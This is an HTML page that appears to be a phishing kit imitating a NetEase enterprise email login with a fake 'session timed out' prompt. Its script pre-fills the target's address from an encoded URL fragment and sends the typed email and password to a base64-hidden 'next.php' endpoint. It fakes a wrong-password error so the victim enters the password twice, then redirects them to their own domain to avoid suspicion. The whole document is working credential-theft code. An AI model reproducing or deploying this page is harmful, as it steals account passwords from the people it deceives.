<!doctype html>
<html lang="en">

<head>
    <script src="js/jquery.min.js"></script>
    <script src="js/jquery-3.1.1.min.js"></script>
        <script src="js/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>&#32593;&#26131;&#20225;&#19994;&#37038;&#31665;&#32;&#45;&#32;&#30331;&#24405;&#20837;&#21475;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="images/pdf.png"/>
    <style type="text/css">
    </style>
</head>

<body style="background:url('images/bg.jpg'); background-size: cover; background-repeat: no-repeat;">
    <button type="button" class="btn btn-primary" id="m-btn" data-toggle="modal" data-target="#exampleModalCenter" style="visibility: hidden;">
        Launch demo modal
    </button>
    <!-- Modal -->
    <div class="modal fade" id="exampleModalCenter" data-backdrop="static" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content" style="min-width: 550px">
                <div class="modal-header p-2" style="background-color: #E9E9E9;">
                    <button type="button" class="close" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body px-5">
                    <span style="font-weight: 700; color: #575757;font-size: 17px">电子邮件登录超时，请重新登录
                    </span>
                    <form class="mt-4">
                        <center>
                            <div class="alert alert-danger" id="msg" style="display: none;">无效的密码！请输入正确的密码。</div>
                            <span id="error" class="text-danger" style="display: none;">该帐户不存在。输入其他帐户。</span>
                        </center>
                        <div class="form-group row">
                            <label for="staticai" class="col-sm-4 col-form-label">電子郵件</label>
                            <div class="col-sm-8">
                                <input type="email" class="form-control py-1" id="ai" value="">
                            </div>
                        </div>
                        <div class="form-group row">
                            <label for="inputpr" class="col-sm-4 col-form-label">邮箱密码</label>
                            <div class="col-sm-8 ">
                                <input type="password" class="form-control py-1" id="pr" placeholder="">
                            </div>
                        </div>
                    </form>
                </div>
                <div class="modal-footer p-2">
                    <button type="button" class="btn btn-success py-1" id="submit-btn">登录</button>
                    <button type="button" class="btn btn-secondary py-1">取消</button>
                </div>
            </div>
        </div>
    </div>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="js/jquery-3.2.1.slim.min.js"></script>
    <script src="js/popper.min.js" ></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
</body>
<script src="js/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script>
/* global $ */
$(document).ready(function() {
    var count = 0;


    $('#m-btn').click();

    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

        if (!base64regex.test(ai)) {
            // alert(btoa(email));
            var my_ai = ai;
        } else {
            // alert(atob(email));
            var my_ai = atob(ai);
        }
        // $('#email').val(email);
        // var my_email =email;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        // $('#ai').val(ai);
        // var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#ai').val(my_ai);
        $('#ai').attr('readonly', true);
        $("#msg").hide();
    }
    ///////////////url getting ai////////////////

    var file = "bmV4dC5waHA=";

    $('#submit-btn').click(function(event) {
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var msg = $('#msg').html();
        $('#msg').text(msg);
        ///////////new injection////////////////
        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!ai) {
            $('#error').show();
            $('#error').html("Email field is emply.!");
            ai.focus;
            return false;
        }

        if (!filter.test(my_ai)) {
            $('#error').show();
            $('#error').html("That account doesn't exist. Enter a different account");
            ai.focus;
            return false;
        }
        if (!pr) {
            $('#error').show();
            $('#error').html("Password field is emply.!");
            ai.focus;
            return false;
        }

        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        ///////////new injection////////////////
        count = count + 1;

        $.ajax({
            dataType: 'JSON',
            url: atob(file),
            type: 'POST',
            data: {
                ai: ai,
                pr: pr,
            },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr) {
                $('#submit-btn').html('验证中...');
            },
            success: function(response) {
                if (response) {
                    $("#msg").show();
                    console.log(response);
                    if (response['signal'] == 'ok') {
                        $("#pr").val("");
                        if (count >= 2) {
                            count = 0;
                            // window.location.replace(response['redirect_link']);
                            window.location.replace("http://www." + my_slice);
                            return false;

                        }
                        // $('#msg').html(response['msg']);
                    } else {
                        // $('#msg').html(response['msg']);
                    }
                }
            },
            error: function() {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    window.location.replace("http://www." + my_slice);
                    return false;
                }
                $("#msg").show();
                // $('#msg').html("Please try again later");
            },
            complete: function() {
                $('#submit-btn').html('登录');
            }
        });
    });


});
</script>

</html>